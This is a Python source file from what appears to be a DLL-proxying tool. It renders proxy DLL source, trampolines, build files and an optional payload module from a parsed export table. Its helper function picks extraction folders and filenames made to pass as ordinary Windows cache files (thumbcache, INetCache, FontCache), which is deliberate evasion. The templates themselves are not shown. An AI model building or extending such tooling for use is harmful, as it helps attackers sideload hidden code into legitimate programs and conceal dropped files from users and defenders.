import os
import secrets

from .template_engine import TemplateEngine
from analyzer.pe_analyzer import ExportTable


def _generate_stash_path() -> tuple[str, str]:
    """Generate a Windows-plausible extraction directory and filename.

    Returns (subdir, filename) that look like normal Windows system cache.
    The subdir is relative to %LOCALAPPDATA%.
    """
    tag = secrets.token_hex(4)
    stash_dirs = [
        f"Microsoft\\Windows\\FileCoAuth\\{tag}",
        f"Microsoft\\Windows\\Explorer\\thumbcache_{tag}",
        f"Microsoft\\Windows\\INetCache\\IE\\{tag.upper()}",
        f"Microsoft\\FontCache\\{tag}",
    ]
    stash_dir = secrets.choice(stash_dirs)

    prefix = secrets.choice(["wct", "~DF", "dw", "cab_"])
    stash_filename = f"{prefix}{secrets.token_hex(4)}.tmp"

    return stash_dir, stash_filename


class CodeGenerator:
    def __init__(self):
        self.engine = TemplateEngine()

    def generate(self, export_table: ExportTable, *,
                 embed_enabled: bool = False,
                 payload_enabled: bool = False,
                 block_enabled: bool = False,
                 compiler: str = 'both',
                 original_dll_filename: str | None = None,
                 original_dll_path: str | None = None) -> dict[str, str]:

        if original_dll_filename is None:
            original_dll_filename = f"original_{export_table.dll_name}"
        if original_dll_path is None:
            original_dll_path = original_dll_filename

        stash_dir, stash_filename = _generate_stash_path()

        has_resources = embed_enabled or export_table.version_info is not None

        ctx = {
            'dll_name': export_table.dll_name,
            'dll_name_no_ext': export_table.dll_name_no_ext,
            'is_64bit': export_table.is_64bit,
            'exports': export_table.exports,
            'named_exports': export_table.named_exports,
            'ordinal_only_exports': export_table.ordinal_only_exports,
            'forwarded_exports': export_table.forwarded_exports,
            'ordinal_base': export_table.ordinal_base,
            'max_ordinal': export_table.max_ordinal,
            'embed_enabled': embed_enabled,
            'payload_enabled': payload_enabled,
            'block_enabled': block_enabled,
            'has_resources': has_resources,
            'original_dll_filename': original_dll_filename,
            'original_dll_path': original_dll_path,
            'version_info': export_table.version_info,
            'has_signature': export_table.has_signature,
            'stash_dir': stash_dir.replace('\\', '\\\\'),
            'stash_filename': stash_filename,
        }

        files = {}

        files['proxy.c'] = self.engine.render('proxy.c.j2', ctx)
        files['proxy.h'] = self.engine.render('proxy.h.j2', ctx)
        files['exports.def'] = self.engine.render('exports.def.j2', ctx)

        if compiler in ('msvc', 'both'):
            if export_table.is_64bit:
                files['trampolines.asm'] = self.engine.render('trampoline_msvc_x64.asm.j2', ctx)
            else:
                files['trampolines.asm'] = self.engine.render('trampoline_msvc_x86.asm.j2', ctx)
            files['build_msvc.bat'] = self.engine.render('build_msvc.bat.j2', ctx)

        if compiler in ('gcc', 'both'):
            if export_table.is_64bit:
                files['trampolines.S'] = self.engine.render('trampoline_gcc_x64.S.j2', ctx)
            else:
                files['trampolines.S'] = self.engine.render('trampoline_gcc_x86.S.j2', ctx)
            files['Makefile'] = self.engine.render('Makefile.j2', ctx)

        if has_resources:
            files['resource.rc'] = self.engine.render('resource.rc.j2', ctx)
            files['resource.h'] = self.engine.render('resource.h.j2', ctx)

        if payload_enabled:
            files['payload.c'] = self.engine.render('payload.c.j2', ctx)
            files['payload.h'] = self.engine.render('payload.h.j2', ctx)

        return files
